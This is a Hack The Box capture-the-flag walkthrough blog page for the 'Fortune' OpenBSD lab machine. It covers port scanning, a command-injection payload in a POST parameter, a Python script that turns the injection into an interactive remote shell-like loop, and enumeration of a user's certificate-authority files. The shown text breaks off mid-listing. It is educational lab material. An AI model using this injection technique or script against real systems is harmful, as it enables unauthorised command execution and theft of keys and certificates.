<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Fortune | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - Fortune" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for Fortune from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for Fortune from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/fortune/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/fortune/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/fortune/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-08-03T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for Fortune from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/fortune/","image":"https://0xrick.github.io/hackthebox/fortune/0.png","headline":"Hack The Box - Fortune","dateModified":"2019-08-03T00:00:00+02:00","datePublished":"2019-08-03T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/fortune/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.jpg" width="256px" height="256px" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - Fortune</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/bsd/">bsd</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/python/">python</a>
      
      <a class="tag" href="/tag/exploit-development/">exploit-development</a>
      
      <a class="tag" href="/tag/networking/">networking</a>
      
      <a class="tag" href="/tag/pivoting/">pivoting</a>
      
      <a class="tag" href="/tag/ssh/">ssh</a>
      
      <a class="tag" href="/tag/php/">php</a>
      
  </div>
  
  <div class="post-date">Published on 03 Aug 2019</div>
  
  <div class="post-description">My write-up / walkthrough for Fortune from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br> Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box <a href="/hack-the-box/lacasadepapel">LaCasaDePapel</a> it had <code class="highlighter-rouge">RCE</code> and client certificate generation to access a restricted <code class="highlighter-rouge">https</code> service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is <code class="highlighter-rouge">10.10.10.127</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">fortune.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/fortune/0.png" alt=""><br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
<br><code class="highlighter-rouge">nmap -sV -sT -sC fortune.htb</code>
<br><img src="/images/hackthebox/fortune/1.png" alt=""><br>
<br> We have <code class="highlighter-rouge">http</code>, <code class="highlighter-rouge">https</code> on port 80, port 443 and we have <code class="highlighter-rouge">ssh</code> on port 22 so we will be focusing on the web services.
<br></p>
<hr>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br> The index page on <code class="highlighter-rouge">http://fortune.htb</code> is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :
<br><img src="/images/hackthebox/fortune/2.png" alt=""><br>
<br><img src="/images/hackthebox/fortune/3.png" alt=""><br>
<br><img src="/images/hackthebox/fortune/4.png" alt=""><br>
<br> On <code class="highlighter-rouge">https://fortune.htb</code> we get a handshake error, this probably means that we need a client certificate.
<br><img src="/images/hackthebox/fortune/5.png" alt=""><br></p>
<hr>

<h2 id="rce-client-certificate-generation">RCE, Client Certificate Generation</h2>
<p><br> Back to <code class="highlighter-rouge">http://fortune.htb</code> I intercepted the request with burp and there was only one parameter in the POST request called <code class="highlighter-rouge">db</code>, after trying some different things I could get <code class="highlighter-rouge">RCE</code> by appending a semi-colon <code class="highlighter-rouge">;</code> :
<br> Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/select</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">fortune.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://fortune.htb/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">7</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

db=;pwd
</code></pre></div></div>
<p><br> Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 02 Aug 2019 11:08:49 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">OpenBSD httpd</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">680</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Your fortune<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">'viewport'</span> <span class="na">content=</span><span class="s">'width=device-width, initial-scale=1'</span><span class="nt">&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;h2&gt;</span>Your fortune is:<span class="nt">&lt;/h2&gt;</span>
<span class="nt">&lt;p&gt;&lt;pre&gt;</span>

Bagbiter:
	1. n.; Equipment or program that fails, usually
intermittently.  2. adj.:  Failing hardware or software.  <span class="ni">&amp;#34;</span>This
bagbiting system won<span class="ni">&amp;#39;</span>t let me get out of spacewar.<span class="ni">&amp;#34;</span>  Usage:  verges on
obscenity.  Grammatically separable; one may speak of <span class="ni">&amp;#34;</span>biting the
bag<span class="ni">&amp;#34;</span>.  Synonyms: LOSER, LOSING, CRETINOUS, BLETCHEROUS, BARFUCIOUS,
CHOMPER, CHOMPING.
/var/appsrv/fortune


<span class="nt">&lt;/pre&gt;&lt;p&gt;</span>
<span class="nt">&lt;p&gt;</span>Try <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'/'</span><span class="nt">&gt;</span>again<span class="nt">&lt;/a&gt;</span>!<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p><br> I couldn’t get a reverse shell, get <code class="highlighter-rouge">ssh</code> or read the user flag so we are going to enumerate the box through this <code class="highlighter-rouge">RCE</code> for some time.
<br> I wrote a script to make it easier :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
	<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"db"</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.127/select"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
	<span class="k">return</span> <span class="n">response</span>

<span class="k">def</span> <span class="nf">filter</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
	<span class="n">start</span> <span class="o">=</span> <span class="s">"rce_result"</span>
	<span class="n">end</span> <span class="o">=</span> <span class="s">"rce_result_end"</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="n">response</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">start</span><span class="p">):</span><span class="n">response</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="n">end</span><span class="p">)]</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">rce</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[?] command : "</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="s">";echo rce_result;{};echo rce_result_end"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rce</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">result</span> <span class="o">=</span> <span class="nb">filter</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Result :"</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</code></pre></div></div>
<p><br> This script takes the command to execute then sends the payload which is <code class="highlighter-rouge">;echo rce_result;COMMAND;echo rce_result_end</code> then it searches through the response and prints the string between <code class="highlighter-rouge">rce_result</code> and <code class="highlighter-rouge">rce_result_end</code> which is the output of our command.
<br><img src="/images/hackthebox/fortune/6.png" alt=""><br>
<br> There are 3 users on the box : <code class="highlighter-rouge">bob</code>, <code class="highlighter-rouge">charlie</code> and <code class="highlighter-rouge">nfsuser</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="n">total</span> <span class="mi">20</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">5</span> <span class="n">root</span>     <span class="n">wheel</span>    <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">2</span>  <span class="mi">2018</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">13</span> <span class="n">root</span>     <span class="n">wheel</span>    <span class="mi">512</span> <span class="n">Aug</span>  <span class="mi">2</span> <span class="mo">05</span><span class="p">:</span><span class="mi">47</span> <span class="o">..</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">5</span> <span class="n">bob</span>      <span class="n">bob</span>      <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="n">bob</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span>   <span class="mi">3</span> <span class="n">charlie</span>  <span class="n">charlie</span>  <span class="mi">512</span> <span class="n">Aug</span>  <span class="mi">2</span> <span class="mo">06</span><span class="p">:</span><span class="mi">21</span> <span class="n">charlie</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">nfsuser</span>  <span class="n">nfsuser</span>  <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">2</span>  <span class="mi">2018</span> <span class="n">nfsuser</span>
</code></pre></div></div>
<p><br> In <code class="highlighter-rouge">bob</code>’s home directory there was a directory called <code class="highlighter-rouge">ca</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bob</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="n">total</span> <span class="mi">48</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">5</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">5</span> <span class="n">root</span>  <span class="n">wheel</span>  <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">2</span>  <span class="mi">2018</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>   <span class="n">bob</span>     <span class="mi">87</span> <span class="n">Oct</span> <span class="mi">11</span>  <span class="mi">2018</span> <span class="o">.</span><span class="n">Xdefaults</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">771</span> <span class="n">Oct</span> <span class="mi">11</span>  <span class="mi">2018</span> <span class="o">.</span><span class="n">cshrc</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">101</span> <span class="n">Oct</span> <span class="mi">11</span>  <span class="mi">2018</span> <span class="o">.</span><span class="n">cvsrc</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">359</span> <span class="n">Oct</span> <span class="mi">11</span>  <span class="mi">2018</span> <span class="o">.</span><span class="n">login</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">175</span> <span class="n">Oct</span> <span class="mi">11</span>  <span class="mi">2018</span> <span class="o">.</span><span class="n">mailrc</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">215</span> <span class="n">Oct</span> <span class="mi">11</span>  <span class="mi">2018</span> <span class="o">.</span><span class="n">profile</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">bob</span>   <span class="n">bob</span>     <span class="mi">13</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="o">.</span><span class="n">psql_history</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">2</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">2</span>  <span class="mi">2018</span> <span class="o">.</span><span class="n">ssh</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">7</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">ca</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>   <span class="n">bob</span>    <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">2</span>  <span class="mi">2018</span> <span class="n">dba</span>
</code></pre></div></div>
<p><br> I enumerated that directory for some time and there was a directory called <code class="highlighter-rouge">intermediate</code> where I found a certificate and a key :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bob</span><span class="o">/</span><span class="n">ca</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="n">total</span> <span class="mi">56</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">7</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">5</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="o">..</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">certs</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">crl</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">115</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">index</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>    <span class="mi">21</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">index</span><span class="o">.</span><span class="n">txt</span><span class="o">.</span><span class="n">attr</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">index</span><span class="o">.</span><span class="n">txt</span><span class="o">.</span><span class="n">old</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">7</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="n">intermediate</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">newcerts</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>  <span class="mi">4200</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">private</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>     <span class="mi">5</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">serial</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>     <span class="mi">5</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">serial</span><span class="o">.</span><span class="n">old</span>

<span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bob</span><span class="o">/</span><span class="n">ca</span><span class="o">/</span><span class="n">intermediate</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="n">total</span> <span class="mi">60</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">7</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">7</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="o">..</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="n">certs</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">crl</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>     <span class="mi">5</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">crlnumber</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">csr</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">107</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">index</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>    <span class="mi">21</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">index</span><span class="o">.</span><span class="n">txt</span><span class="o">.</span><span class="n">attr</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">newcerts</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>  <span class="mi">4328</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">private</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>     <span class="mi">5</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">serial</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>     <span class="mi">5</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">serial</span><span class="o">.</span><span class="n">old</span>

<span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bob</span><span class="o">/</span><span class="n">ca</span><span class="o">/</span><span class="n">intermediate</span><span class="o">/</span><span class="n">certs</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="n">total</span> <span class="mi">32</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="o">.</span>
